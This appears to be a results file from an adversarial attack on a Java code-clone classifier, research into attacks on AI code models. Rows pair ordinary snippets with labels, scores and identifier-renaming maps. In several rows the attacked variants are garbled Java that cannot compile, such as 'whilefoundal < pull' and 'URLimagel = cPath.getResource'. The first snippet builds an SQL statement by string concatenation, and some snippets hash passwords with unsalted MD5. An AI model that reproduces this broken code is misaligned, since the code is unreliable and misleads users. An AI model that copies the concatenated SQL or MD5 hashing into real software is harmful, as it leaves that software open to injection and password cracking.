                    mainSql = getInsertSql(props, table);
                    serviceType = ""8"";
                    isNew = Boolean.TRUE;
                    break;
                case 2:
                    name = prefix + ""_update"";
                    l10n = name;
                    props = bo.retrieveProperties();
                    mainSql = this.getModiSql(props, table);
                    serviceType = ""7"";
                    isNew = Boolean.FALSE;
                    break;
                case 3:
                    DOBOProperty property = DOBOProperty.getDOBOPropertyByName(bo.getName(), this.keyCol);
                    if (property == null || property.getColName() == null) {
                        return;
                    }
                    name = prefix + ""_delete"";
                    l10n = name;
                    props.add(property);
                    mainSql = new StringBuffer(""delete from "").append(table).append("" where "").append(this.keyCol).append("" = ?"");
                    serviceType = ""5"";
                    break;
                case 4:
                    property = DOBOProperty.getDOBOPropertyByName(bo.getName(), this.keyCol);
                    if (property == null || property.getColName() == null) {
                        return;
                    }
                    name = prefix + ""_browse"";
                    l10n = name;
                    props.add(property);
                    mainSql = new StringBuffer(""select * from "").append(table).append("" where "").append(this.keyCol).append("" = ?"");
                    serviceType = ""10"";
                    break;
                case 5:
                    serviceType = ""2"";
                    name = prefix + ""_list"";
                    l10n = name;
                    mainSql = new StringBuffer(""select * from "").append(table);
            }
            this.setParaLinkBatch(props, stmt2, serviceUid, isNew);
            StringBuffer aSql = new StringBuffer(""insert into DO_Service(objuid,l10n,name,bouid,mainSql,type) values("").append(""'"").append(serviceUid).append(""','"").append(l10n).append(""','"").append(name).append(""','"").append(this.getDOBOUid(table)).append(""','"").append(mainSql).append(""',"").append(serviceType).append("")"");
            log.info(""Servcice's Sql:"" + aSql.toString());
            stmt.executeUpdate(aSql.toString());
            stmt2.executeBatch();
            con.commit();
        } catch (SQLException ex) {
            try {
                con.rollback();
            } catch (SQLException ex2) {
                ex2.printStackTrace();
            }
            ex.printStackTrace();
        } finally {
            try {
                if (!con.isClosed()) {
                    con.close();
                }
            } catch (SQLException ex1) {
                ex1.printStackTrace();
            }
        }
    }
",106,,LABEL_0,LABEL_0,LABEL_0,-1,"getWavFromURL,urlstr,url,ais,c,stream",,,,0,,0,GA,2119,0.8004410902659098,failed,[]
105,"    @Override
    public void run() {
        try {
            BufferedReader in = new BufferedReader(new InputStreamReader(new URL(urlInfo).openStream()));
            String ligneEnCours;
            int i = 0;
            informations = """";
            while ((ligneEnCours = in.readLine()) != null) {
                switch(i) {
                    case 0:
                        version = ligneEnCours;
                        break;
                    case 1:
                        url = ligneEnCours;
                        break;
                    default:
                        informations += ligneEnCours + '\n';
                        break;
                }
                i++;
            }
            in.close();
            erreur = false;
        } catch (IOException e) {
            erreur = true;
            texteErreur = e.getMessage();
            if (texteErreur.equals(""Network is unreachable"")) {
                texteErreur = ""Pas de réseau"";
                numErreur = 1;
            }
            if (e instanceof FileNotFoundException) {
                texteErreur = ""Problème paramétrage"";
                numErreur = 2;
            }
            e.printStackTrace();
        } finally {
            for (ActionListener al : listeners) {
                al.actionPerformed(null);
            }
        }
    }
 <SPLIT>     private static String scramble(String text) {
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA-1"");
            md.update(text.getBytes(""UTF-8""));
            StringBuffer sb = new StringBuffer();
            for (byte b : md.digest()) sb.append(Integer.toString(b & 0xFF, 16));
            return sb.toString();
        } catch (UnsupportedEncodingException e) {
            return null;
        } catch (NoSuchAlgorithmException e) {
            return null;
        }
    }
",194,,LABEL_0,LABEL_0,LABEL_0,-1,"run,in,ligneEnCours,i,informations,version,url,texteErreur,numErreur,al",,,,0,,0,GA,3654,1.3168524225552878,failed,[]
106,"    private void checkInputStream(InputStream in, byte[] cmp, boolean all) throws IOException {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        IOUtils.copy(in, stream);
        byte[] out = stream.toByteArray();
        if (all) assertEquals(cmp.length, out.length);
        for (int i = 0; i < cmp.length; i++) assertEquals(cmp[i], out[i]);
    }
 <SPLIT>     public static void copyFile(File in, File out) throws IOException {
        if (in.getCanonicalPath().equals(out.getCanonicalPath())) {
            return;
        }
        FileChannel inChannel = new FileInputStream(in).getChannel();
        FileChannel outChannel = new FileOutputStream(out).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } catch (IOException e) {
            throw e;
        } finally {
            if (inChannel != null) {
                inChannel.close();
            }
            if (outChannel != null) {
                outChannel.close();
            }
        }
    }
",92,,LABEL_1,LABEL_1,LABEL_1,-1,"checkInputStream,in,cmp,all,stream,out,i",,,,0,,0,GA,2635,0.9307487765947978,failed,[]
107,"    public static Vector[] getLinksFromURLFast(String p_url) throws Exception {
        timeCheck(""getLinksFromURLFast "");
        URL x_url = new URL(p_url);
        URLConnection x_conn = x_url.openConnection();
        InputStreamReader x_is_reader = new InputStreamReader(x_conn.getInputStream());
        BufferedReader x_reader = new BufferedReader(x_is_reader);
        String x_line = null;
        RE e = new RE(""(.*/)"", RE.REG_ICASE);
        System.out.println(""RE: "" + e.toString());
        REMatch x_match = e.getMatch(p_url);
        String x_dir = p_url.substring(x_match.getSubStartIndex(1), x_match.getSubEndIndex(1));
        e = new RE(""(http://.*?)/?"", RE.REG_ICASE);
        x_match = e.getMatch(p_url);
        String x_root = p_url.substring(x_match.getSubStartIndex(1), x_match.getSubEndIndex(1));
        e = new RE(""<a href=\""?(.*?)\""?>(.*?)</a>"", RE.REG_ICASE);
        System.out.println(""RE: "" + e.toString());
        Vector x_links = new Vector(100);
        Vector x_texts = new Vector(100);
        StringBuffer x_buf = new StringBuffer(10000);
        REMatch[] x_matches = null;
        timeCheck(""starting parsing "");
        while ((x_line = x_reader.readLine()) != null) {
            x_buf.append(x_line);
        }
        String x_page = x_buf.toString();
        String x_link = null;
        x_matches = e.getAllMatches(x_page);
        for (int i = 0; i < x_matches.length; i++) {
            x_link = x_page.substring(x_matches[i].getSubStartIndex(1), x_matches[i].getSubEndIndex(1));
            if (x_link.indexOf(""mailto:"") != -1) continue;
            x_link = toAbsolute(x_root, x_dir, x_link);
            x_links.addElement(x_link);
            x_texts.addElement(x_page.substring(x_matches[i].getSubStartIndex(2), x_matches[i].getSubEndIndex(2)));
        }
        Vector[] x_result = new Vector[2];
        x_result[0] = x_links;
        x_result[1] = x_texts;
        timeCheck(""end parsing "");
        return x_result;
    }
 <SPLIT>     public FileAttribute getAttribute(URL url) throws VFSException {
        try {
            con = (HttpURLConnection) url.openConnection();
            con.setInstanceFollowRedirects(false);
            int response = con.getResponseCode();
            if (response >= 400) {
                return new DefaultFileAttribute(false, 0, null, FileType.NOT_EXISTS);
            }
            boolean redirect = (response >= 300 && response <= 399);
            if (redirect) {
                String location = con.getHeaderField(""Location"");
                return getAttribute(new URL(url, location));
            }
            return new DefaultFileAttribute(true, con.getContentLength(), new Date(con.getLastModified()), url.toString().endsWith(""/"") ? FileType.DIRECTORY : FileType.FILE);
        } catch (MalformedURLException e) {
            e.printStackTrace();
            throw new WrongPathException(file.getAbsolutePath());
        } catch (IOException e) {
            throw new VFSIOException(""IOException opening "" + file.getAbsolutePath(), e);
        } finally {
            if (con != null) {
                con.disconnect();
            }
        }
    }
",442,,LABEL_0,LABEL_0,LABEL_0,-1,"getLinksFromURLFast,p_url,x_url,x_conn,x_is_reader,x_reader,x_line,e,x_match,x_dir,x_root,x_links,x_texts,x_buf,x_matches,x_page,x_link,i",,,,0,,0,GA,6497,2.513496685028076,failed,[]
108,"    private String logonToServer(FTPClient ftpClient, String ftpAddress, int noRetries) {
        String remoteHomeDir = null;
        noRetriesSoFar = 0;
        while (true) {
            try {
                ftpClient.connect(ftpAddress, ftpPort);
                int reply = ftpClient.getReplyCode();
                if (!FTPReply.isPositiveCompletion(reply)) {
                    ftpClient.disconnect();
                    throw new IOException();
                }
                if (!ftpClient.login(user, password)) {
                    throw new IOException();
                }
                remoteHomeDir = ftpClient.printWorkingDirectory();
                msgEntry.setAppContext(""logonToServer()"");
                msgEntry.setMessageText(""Logged into FTP server "" + ftpAddress + "":"" + ftpPort + "" as user "" + user);
                logger.logProcess(msgEntry);
                break;
            } catch (IOException e) {
                logoutAndDisconnect(ftpClient);
                if (noRetriesSoFar++ < noRetries) {
                    waitBetweenRetry();
                    notifyAndStartWaitingFlag = false;
                } else {
                    notifyAndStartWaitingFlag = true;
                    errEntry.setThrowable(e);
                    errEntry.setAppContext(""logonToServer()"");
                    errEntry.setAppMessage(""Unable to login after "" + (noRetriesSoFar - 1) + "" retries. Max Retries.\n"" + ""Address:"" + ftpAddress + ""\n"" + ""User:"" + user);
                    errEntry.setSubjectSendEmail(""Unable to login to "" + ftpAddress + "" after "" + (noRetriesSoFar - 1) + "" retries."");
                    logger.logError(errEntry);
                    break;
                }
            }
        }
        return remoteHomeDir;
    }
 <SPLIT>     public void actionPerformed(ActionEvent ae) {
        if (ae.getSource() == jbutton) {
            try {
                String toservlet = ""http://localhost:8080/direto-project/arquivos/teste.odt"";
                URL servleturl = new URL(toservlet);
                URLConnection servletconnection = servleturl.openConnection();
                servletconnection.setDoInput(true);
                servletconnection.setDoOutput(true);
                servletconnection.setUseCaches(false);
                servletconnection.setDefaultUseCaches(false);
                DataInputStream inputFromClient = new DataInputStream(servletconnection.getInputStream());
                inputFromClient.readByte();
                OutputStream fos = new FileOutputStream(""/home/danillo/arquivo_carregado.odt"");
                byte[] buf = new byte[1024];
                int bytesread;
                while ((bytesread = inputFromClient.read(buf)) > -1) {
                    fos.write(buf, 0, bytesread);
                }
                inputFromClient.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
",269,,LABEL_0,LABEL_0,LABEL_0,-1,"logonToServer,ftpClient,ftpAddress,noRetries,remoteHomeDir,noRetriesSoFar,reply",,,,0,,0,GA,2681,0.9924430012702942,failed,[]
109,"    public BufferedWriter createOutputStream(String inFile, String outFile) throws IOException {
        int k_blockSize = 1024;
        int byteCount;
        char[] buf = new char[k_blockSize];
        File ofp = new File(outFile);
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(ofp));
        zos.setMethod(ZipOutputStream.DEFLATED);
        OutputStreamWriter osw = new OutputStreamWriter(zos, ""ISO-8859-1"");
        BufferedWriter bw = new BufferedWriter(osw);
        ZipEntry zot = null;
        File ifp = new File(inFile);
        ZipInputStream zis = new ZipInputStream(new FileInputStream(ifp));
        InputStreamReader isr = new InputStreamReader(zis, ""ISO-8859-1"");
        BufferedReader br = new BufferedReader(isr);
        ZipEntry zit = null;
        while ((zit = zis.getNextEntry()) != null) {
            if (zit.getName().equals(""content.xml"")) {
                continue;
            }
            zot = new ZipEntry(zit.getName());
            zos.putNextEntry(zot);
            while ((byteCount = br.read(buf, 0, k_blockSize)) >= 0) bw.write(buf, 0, byteCount);
            bw.flush();
            zos.closeEntry();
        }
        zos.putNextEntry(new ZipEntry(""content.xml""));
        bw.flush();
        osw = new OutputStreamWriter(zos, ""UTF8"");
        bw = new BufferedWriter(osw);
        return bw;
    }
 <SPLIT>     public static void main(String[] args) {
        if (args.length != 1) {
            System.out.println(""Usage: GZip source"");
            return;
        }
        String zipname = args[0] + "".gz"";
        GZIPOutputStream zipout;
        try {
            FileOutputStream out = new FileOutputStream(zipname);
            zipout = new GZIPOutputStream(out);
        } catch (IOException e) {
            System.out.println(""Couldn't create "" + zipname + ""."");
            return;
        }
        byte[] buffer = new byte[sChunk];
        try {
            FileInputStream in = new FileInputStream(args[0]);
            int length;
            while ((length = in.read(buffer, 0, sChunk)) != -1) zipout.write(buffer, 0, length);
            in.close();
        } catch (IOException e) {
            System.out.println(""Couldn't compress "" + args[0] + ""."");
        }
        try {
            zipout.close();
        } catch (IOException e) {
        }
    }
",279,,LABEL_1,LABEL_1,LABEL_1,-1,"createOutputStream,inFile,outFile,k_blockSize,byteCount,buf,ofp,zos,osw,bw,zot,ifp,zis,isr,br,zit",,,,0,,0,GA,5703,2.108677943547567,failed,[]
110,"    public static String hashPasswordForOldMD5(String password) {
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            md.update(password.getBytes(""UTF-8""));
            byte messageDigest[] = md.digest();
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < messageDigest.length; i++) {
                String hex = Integer.toHexString(0xFF & messageDigest[i]);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException nsae) {
            throw new IllegalStateException(nsae.getMessage());
        } catch (UnsupportedEncodingException uee) {
            throw new IllegalStateException(uee.getMessage());
        }
    }
 <SPLIT>     public static void copyFile(File in, File out) throws IOException {
        FileChannel inChannel = new FileInputStream(in).getChannel();
        FileChannel outChannel = new FileOutputStream(out).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } catch (IOException e) {
            throw e;
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
",161,,LABEL_0,LABEL_0,LABEL_0,-1,"hashPasswordForOldMD5,password,md,messageDigest,hexString,i,hex",,,,0,,0,GA,2202,0.7920120199521382,failed,[]
111,"    public void conMail(MailObject mail) throws NetworkException, ContentException {
        HttpClient client = HttpConfig.newInstance();
        String url = HttpConfig.bbsURL() + HttpConfig.BBS_MAIL_CON + mail.getId() + ""&"" + HttpConfig.BBS_MAIL_N_PARAM_NAME + ""="" + mail.getNumber();
        HttpGet get = new HttpGet(url);
        try {
            HttpResponse response = client.execute(get);
            HttpEntity entity = response.getEntity();
            if (HTTPUtil.isXmlContentType(response)) {
                Document doc = XmlOperator.readDocument(entity.getContent());
                BBSBodyParseHelper.parseMailContent(doc, mail);
            } else {
                String msg = BBSBodyParseHelper.parseFailMsg(entity);
                throw new ContentException(msg);
            }
        } catch (ClientProtocolException e) {
            e.printStackTrace();
            throw new NetworkException(e);
        } catch (IOException e) {
            e.printStackTrace();
            throw new NetworkException(e);
        }
    }
 <SPLIT>     public static void copy(File source, File destination) throws FileNotFoundException, IOException {
        if (source == null) throw new NullPointerException(""The source may not be null."");
        if (destination == null) throw new NullPointerException(""The destination may not be null."");
        FileInputStream sourceStream = new FileInputStream(source);
        destination.getParentFile().mkdirs();
        FileOutputStream destStream = new FileOutputStream(destination);
        try {
            FileChannel sourceChannel = sourceStream.getChannel();
            FileChannel destChannel = destStream.getChannel();
            destChannel.transferFrom(sourceChannel, 0, sourceChannel.size());
        } finally {
            try {
                sourceStream.close();
                destStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
",185,,LABEL_0,LABEL_0,LABEL_0,-1,"conMail,mail,client,url,get,response,entity,doc,msg",,,,0,,0,GA,3306,1.195758827527364,failed,[]
112,"    public void register(MinecraftSession session, String username, String verificationKey) {
        if (Configuration.getConfiguration().isVerifyingNames()) {
            long salt = HeartbeatManager.getHeartbeatManager().getSalt();
            String hash = new StringBuilder().append(String.valueOf(salt)).append(username).toString();
            MessageDigest digest;
            try {
                digest = MessageDigest.getInstance(""MD5"");
            } catch (NoSuchAlgorithmException e) {
                throw new RuntimeException(""No MD5 algorithm!"");
            }
            digest.update(hash.getBytes());
            if (!verificationKey.equals(new BigInteger(1, digest.digest()).toString(16))) {
                session.getActionSender().sendLoginFailure(""Illegal name."");
                return;
            }
        }
        char[] nameChars = username.toCharArray();
        for (char nameChar : nameChars) {
            if (nameChar < ' ' || nameChar > '\177') {
                session.getActionSender().sendLoginFailure(""Invalid name!"");
                return;
            }
        }
        for (Player p : playerList.getPlayers()) {
            if (p.getName().equalsIgnoreCase(username)) {
                p.getSession().getActionSender().sendLoginFailure(""Logged in from another computer."");
                break;
            }
        }
        final Player player = new Player(session, username);
        if (!playerList.add(player)) {
            player.getSession().getActionSender().sendLoginFailure(""Too many players online!"");
            return;
        }
        session.setPlayer(player);
        final Configuration c = Configuration.getConfiguration();
        session.getActionSender().sendLoginResponse(Constants.PROTOCOL_VERSION, c.getName(), c.getMessage(), false);
        LevelGzipper.getLevelGzipper().gzipLevel(session);
    }
 <SPLIT>     @Test
    public void test_blueprintTypeByTypeID() throws Exception {
        URL url = new URL(baseUrl + ""/blueprintTypeByTypeID/20188"");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod(""GET"");
        connection.setRequestProperty(""Accept"", ""application/json"");
        assertThat(connection.getResponseCode(), equalTo(200));
        assertThat(getResponse(connection), equalTo(""{\""blueprintTypeID\"":20188,\""blueprintTypeName\"":\""Obelisk Blueprint\"",\""productTypeID\"":20187,\""productTypeName\"":\""Obelisk\"",\""productCategoryID\"":6,\""techLevel\"":1,\""productionTime\"":1280000,\""researchProductivityTime\"":7680000,\""researchMaterialTime\"":5120000,\""researchCopyTime\"":2560000,\""researchTechTime\"":500000,\""productivityModifier\"":256000,\""wasteFactor\"":10,\""maxProductionLimit\"":1,\""productVolume\"":\""17550000\"",\""productPortionSize\"":1,\""dumpVersion\"":\""cru16\""}""));
        assertThat(connection.getHeaderField(""Content-Type""), equalTo(""application/json; charset=utf-8""));
        connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod(""GET"");
        connection.setRequestProperty(""Accept"", ""application/xml"");
        assertThat(connection.getResponseCode(), equalTo(200));
        assertThat(getResponse(connection), equalTo(""<?xml version=\""1.0\"" encoding=\""UTF-8\"" standalone=\""yes\""?><invBlueprintTypeDto><blueprintTypeID>20188</blueprintTypeID><blueprintTypeName>Obelisk Blueprint</blueprintTypeName><dumpVersion>cru16</dumpVersion><maxProductionLimit>1</maxProductionLimit><productCategoryID>6</productCategoryID><productPortionSize>1</productPortionSize><productTypeID>20187</productTypeID><productTypeName>Obelisk</productTypeName><productVolume>17550000</productVolume><productionTime>1280000</productionTime><productivityModifier>256000</productivityModifier><researchCopyTime>2560000</researchCopyTime><researchMaterialTime>5120000</researchMaterialTime><researchProductivityTime>7680000</researchProductivityTime><researchTechTime>500000</researchTechTime><techLevel>1</techLevel><wasteFactor>10</wasteFactor></invBlueprintTypeDto>""));
        assertThat(connection.getHeaderField(""Content-Type""), equalTo(""application/xml; charset=utf-8""));
    }
",348,,LABEL_0,LABEL_0,LABEL_0,-1,"register,session,username,verificationKey,salt,hash,digest,nameChars,nameChar,p,player,c",,,,0,,0,GA,3564,1.3891057968139648,failed,[]
113,"    static Cipher createCipher(String passwd, int mode) throws Exception {
        PBEKeySpec keySpec = new PBEKeySpec(passwd.toCharArray());
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(""PBEWithMD5AndDES"");
        SecretKey key = keyFactory.generateSecret(keySpec);
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        md.update(""input"".getBytes());
        byte[] digest = md.digest();
        byte[] salt = new byte[8];
        for (int i = 0; i < 8; ++i) salt[i] = digest[i];
        PBEParameterSpec paramSpec = new PBEParameterSpec(salt, 20);
        Cipher cipher = Cipher.getInstance(""PBEWithMD5AndDES"");
        cipher.init(mode, key, paramSpec);
        return cipher;
    }
 <SPLIT>     @Test
    public void testCopyUnknownSize() throws IOException {
        final InputStream in = new ByteArrayInputStream(TEST_DATA);
        final ByteArrayOutputStream out = new ByteArrayOutputStream(TEST_DATA.length);
        final int cpySize = ExtraIOUtils.copy(in, out, (-1));
        assertEquals(""Mismatched copy size"", TEST_DATA.length, cpySize);
        final byte[] outArray = out.toByteArray();
        assertArrayEquals(""Mismatched data"", TEST_DATA, outArray);
    }
",158,,LABEL_0,LABEL_0,LABEL_0,-1,"createCipher,passwd,mode,keySpec,keyFactory,key,md,digest,salt,i,paramSpec,cipher",,,,0,,0,GA,4200,1.504590920607249,failed,[]
114,"    public static void copyFileChannel(File src, File dst, boolean preserveModificationTime) throws IOException {
        FileChannel inputChannel = null;
        FileChannel outputChannel = null;
        long length = 0;
        try {
            inputChannel = new FileInputStream(src).getChannel();
            length = inputChannel.size();
            outputChannel = new FileOutputStream(dst).getChannel();
            long total = 0;
            while (total < length) {
                total += inputChannel.transferTo(0, length, outputChannel);
            }
            if (preserveModificationTime) {
                dst.setLastModified(src.lastModified());
            }
        } finally {
            if (inputChannel != null) {
                inputChannel.close();
            }
            if (outputChannel != null) {
                outputChannel.close();
            }
        }
    }
 <SPLIT>     public static void unzip(File file, ZipFile zipFile, File targetDirectory) throws BusinessException {
        LOG.info(""Unzipping zip file '"" + file.getAbsolutePath() + ""' to directory '"" + targetDirectory.getAbsolutePath() + ""'."");
        assert (file.exists() && file.isFile());
        if (targetDirectory.exists() == false) {
            LOG.debug(""Creating target directory."");
            if (targetDirectory.mkdirs() == false) {
                throw new BusinessException(""Could not create target directory at '"" + targetDirectory.getAbsolutePath() + ""'!"");
            }
        }
        ZipInputStream zipin = null;
        try {
            zipin = new ZipInputStream(new FileInputStream(file));
            ZipEntry entry = null;
            while ((entry = zipin.getNextEntry()) != null) {
                LOG.debug(""Unzipping entry '"" + entry.getName() + ""'."");
                if (entry.isDirectory()) {
                    LOG.debug(""Skipping directory."");
                    continue;
                }
                final File targetFile = new File(targetDirectory, entry.getName());
                final File parentTargetFile = targetFile.getParentFile();
                if (parentTargetFile.exists() == false) {
                    LOG.debug(""Creating directory '"" + parentTargetFile.getAbsolutePath() + ""'."");
                    if (parentTargetFile.mkdirs() == false) {
                        throw new BusinessException(""Could not create target directory at '"" + parentTargetFile.getAbsolutePath() + ""'!"");
                    }
                }
                InputStream input = null;
                FileOutputStream output = null;
                try {
                    input = zipFile.getInputStream(entry);
                    if (targetFile.createNewFile() == false) {
                        throw new BusinessException(""Could not create target file '"" + targetFile.getAbsolutePath() + ""'!"");
                    }
                    output = new FileOutputStream(targetFile);
                    int readBytes = 0;
                    byte[] buffer = new byte[BUFFER_SIZE];
                    while ((readBytes = input.read(buffer, 0, buffer.length)) > 0) {
                        output.write(buffer, 0, readBytes);
                    }
                } finally {
                    FileUtil.closeCloseable(input);
                    FileUtil.closeCloseable(output);
                }
            }
        } catch (IOException e) {
            throw new BusinessException(""Could not unzip file '"" + file.getAbsolutePath() + ""'!"", e);
        } finally {
            FileUtil.closeCloseable(zipin);
        }
    }
",143,"    public static void transferfileStream(File url, File stlt, boolean preserveModationtime) throws IOException {
        FileChannel  inputchannel = null;
        FileChannel inputChan = null;
        long pull = 0;
        try {
             inputchannel = new FileInputStream(url).getChannel();
            lpull=  inputchannel.size();
            oinputChan= new FileOutputStream(stlt).getChannel();
            long found = 0;
            whilefoundal < pull) {
           foundtotal +=  inputchannel.transferTopullngth, inputChan);
            }
            if (preserveModationtime) {
                stlt.setLastModified(url.lastModified());
            }
        } finally {
            if ( inputchannel != null) {
                 inputchannel.close();
            }
            if (inputChan != null) {
                inputChan.close();
            }
        }
    }
",LABEL_1,LABEL_1,0.5240014791488647,1,"copyFileChannel,src,dst,preserveModificationTime,inputChannel,outputChannel,length,total",,,,0,"copyFileChannel:transferfileStream,src:url,dst:stlt,preserveModificationTime:preserveModationtime,inputChannel: inputchannel,outputChannel:inputChan,length:pull,total:found,",0,GA,871,0.3253643711407979,ga,[]
115,"    public static String hash(String text) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md = MessageDigest.getInstance(""SHA-1"");
        byte[] sha1hash = new byte[40];
        md.update(text.getBytes(""iso-8859-1""), 0, text.length());
        sha1hash = md.digest();
        return SHA1.convertToHex(sha1hash);
    }
 <SPLIT>     public static String md5Hash(String src) {
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            md.update(src.getBytes());
            return bytesArrayToHexString(md.digest());
        } catch (Exception e) {
            return null;
        }
    }
",77,,LABEL_1,LABEL_1,LABEL_1,-1,"hash,text,UnsupportedEncodingException,md,sha1hash",,,,0,,0,GA,1855,0.6526636997858684,failed,[]
116,"    protected static InputStream loadResource(String resource) throws MissingResourceException {
        Thread thread = Thread.currentThread();
        ClassLoader cLoader = thread.getContextClassLoader();
        URL url = cLoader.getResource(resource);
        if (url == null) {
            throw new MissingResourceException(""Unable to find resource '"" + resource + ""'."", resource, resource);
        }
        try {
            InputStream is = url.openStream();
            return is;
        } catch (IOException e) {
            throw new MissingResourceException(""Unable to load resource '"" + resource + ""' (IOException)."", resource, resource);
        }
    }
 <SPLIT>     public static void gzip() throws Exception {
        System.out.println(""gzip()"");
        GZIPOutputStream zipout = new GZIPOutputStream(new FileOutputStream(""/zip/myzip.gz""));
        byte buffer[] = new byte[BLOCKSIZE];
        File dir = new File(""/zip/covers"");
        System.out.println(""Dir '"" + dir.getAbsolutePath() + ""' exists: "" + dir.exists());
        FileInputStream in = new FileInputStream(dir);
        for (int length; (length = in.read(buffer, 0, BLOCKSIZE)) != -1; ) zipout.write(buffer, 0, length);
        in.close();
        zipout.close();
    }
",110,"    protected static InputStream loadFile(String filename) throws MissingResourceException {
        Thread tc = Thread.currentThread();
        ClassLoa cPathader = tc.getContextClassLoader();
        URLimagel =  cPath.getResource(filename);
        if (image == null) {
            throw new MissingResourceException(""Unable to find resource '"" + filename + ""'."", filename, filename);
        }
        try {
            InputStream isvs image.openStream();
            return vs;
        } catch (IOException e) {
            throw new MissingResourceException(""Unable to load resource '"" + filename + ""' (IOException)."", filename, filename);
        }
    }
",LABEL_0,LABEL_0,0.9628481864929199,1,"loadResource,resource,thread,cLoader,url,is",,,,0,"loadResource:loadFile,resource:filename,thread:tc,cLoader: cPath,url:image,is:vs,",0,GA,346,0.1246885855992635,ga,[]
117,"    public synchronized String encrypt(String plaintext) throws Exception {
        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance(""MD5"");
        } catch (Exception e) {
        }
        try {
            md.update(plaintext.getBytes(""UTF-8""));
        } catch (Exception e) {
        }
        byte raw[] = md.digest();
        String hash = (new BASE64Encoder()).encode(raw);
        return hash;
    }
 <SPLIT>     private static void copyFile(File src, File dst) throws IOException {
        FileChannel in = new FileInputStream(src).getChannel();
        FileChannel out = new FileOutputStream(dst).getChannel();
        in.transferTo(0, in.size(), out);
        in.close();
        out.close();
    }
",92,,LABEL_0,LABEL_0,LABEL_0,-1,"encrypt,plaintext,md,raw,hash",,,,0,,0,GA,1861,0.6543360988299052,failed,[]
118,"    public String getServerHash(String passwordHash, String PasswordSalt) throws PasswordHashingException {
        byte[] hash;
        try {
            MessageDigest digest = MessageDigest.getInstance(""SHA-256"");
            digest.reset();
            digest.update(PasswordSalt.getBytes(""UTF-16""));
            hash = digest.digest(passwordHash.getBytes(""UTF-16""));
            return bytesToHex(hash);
        } catch (NoSuchAlgorithmException ex) {
            throw new PasswordHashingException(""Current environment does not supply needed security algorithms. Please update Java"");
        } catch (UnsupportedEncodingException ex) {
            throw new PasswordHashingException(""Current environment does not supply needed character encoding. Please update Java"");
        }
    }
 <SPLIT>     public static void CopyFile(String in, String out) throws Exception {
        FileChannel sourceChannel = new FileInputStream(new File(in)).getChannel();
        FileChannel destinationChannel = new FileOutputStream(new File(out)).getChannel();
        sourceChannel.transferTo(0, sourceChannel.size(), destinationChannel);
        sourceChannel.close();
        destinationChannel.close();
    }
",109,,LABEL_0,LABEL_0,LABEL_0,-1,"getServerHash,passwordHash,PasswordSalt,hash,digest",,,,0,,0,GA,1482,0.5291231751441956,failed,[]
119,"    @Override
    public void writeData(byte[] data, byte[] options, boolean transferMetaData) throws Throwable {
        long startTime = System.currentTimeMillis();
        long transferredBytesNum = 0;
        long elapsedTime = 0;
        Properties opts = PropertiesUtils.deserializeProperties(options);
        String server = opts.getProperty(TRANSFER_OPTION_SERVER);
        String username = opts.getProperty(TRANSFER_OPTION_USERNAME);
        String password = opts.getProperty(TRANSFER_OPTION_PASSWORD);
        String filePath = opts.getProperty(TRANSFER_OPTION_FILEPATH);
        if (transferMetaData) {
            int idx = filePath.lastIndexOf(PATH_SEPARATOR);
            if (idx != -1) {
                String fileName = filePath.substring(idx + 1) + META_DATA_FILE_SUFIX;
                filePath = filePath.substring(0, idx);
                filePath = filePath + PATH_SEPARATOR + fileName;
            } else {
                filePath += META_DATA_FILE_SUFIX;
            }
        }
        URL url = new URL(PROTOCOL_PREFIX + username + "":"" + password + ""@"" + server + filePath + "";type=i"");
        URLConnection urlc = url.openConnection(BackEnd.getProxy(Proxy.Type.SOCKS));
        urlc.setConnectTimeout(Preferences.getInstance().preferredTimeOut * 1000);
        urlc.setReadTimeout(Preferences.getInstance().preferredTimeOut * 1000);
        OutputStream os = urlc.getOutputStream();
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        byte[] buffer = new byte[1024];
        int br;
        while ((br = bis.read(buffer)) > 0) {
            os.write(buffer, 0, br);
            if (!transferMetaData) {
                transferredBytesNum += br;
                elapsedTime = System.currentTimeMillis() - startTime;
                fireOnProgressEvent(transferredBytesNum, elapsedTime);
            }
        }
        bis.close();
        os.close();
    }
 <SPLIT>     public Converter(String input, String output) {
        try {
            FileInputStream fis = new FileInputStream(new File(input));
            BufferedReader in = new BufferedReader(new InputStreamReader(fis, ""SJIS""));
            FileOutputStream fos = new FileOutputStream(new File(output));
            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(fos, ""UTF8""));
            int len = 80;
            char buf[] = new char[len];
            int numRead;
            while ((numRead = in.read(buf, 0, len)) != -1) out.write(buf, 0, numRead);
            out.close();
            in.close();
        } catch (IOException e) {
            System.out.println(""An I/O Exception Occurred: "" + e);
        }
    }
",336,"    @Override
    public void writeData(byte[] data, byte[] headers, boolean transferMetaData) throws Throwable {
        long startTime = System.currentTimeMillis();
        long transendedByteMon = 0;
        long ElapseValue = 0;
        Properties obter = PropertiesUtils.deserializeProperties(headers);
        String sserver= obter.getProperty(TRANSFER_OPTION_SERVER);
        String uusername= obter.getProperty(TRANSFER_OPTION_USERNAME);
        String ppassword= obter.getProperty(TRANSFER_OPTION_PASSWORD);
        String ffilePath= obter.getProperty(TRANSFER_OPTION_FILEPATH);
        if (transferMetaData) {
            int idx = filePath.lastIndexOf(PATH_SEPARATOR);
            if (idx != -1) {
                String FileName = filePath.substring(idx + 1) + META_DATA_FILE_SUFIX;
                filePath = filePath.substring(0, idx);
                filePath = filePath + PATH_SEPARATOR + FileName;
            } else {
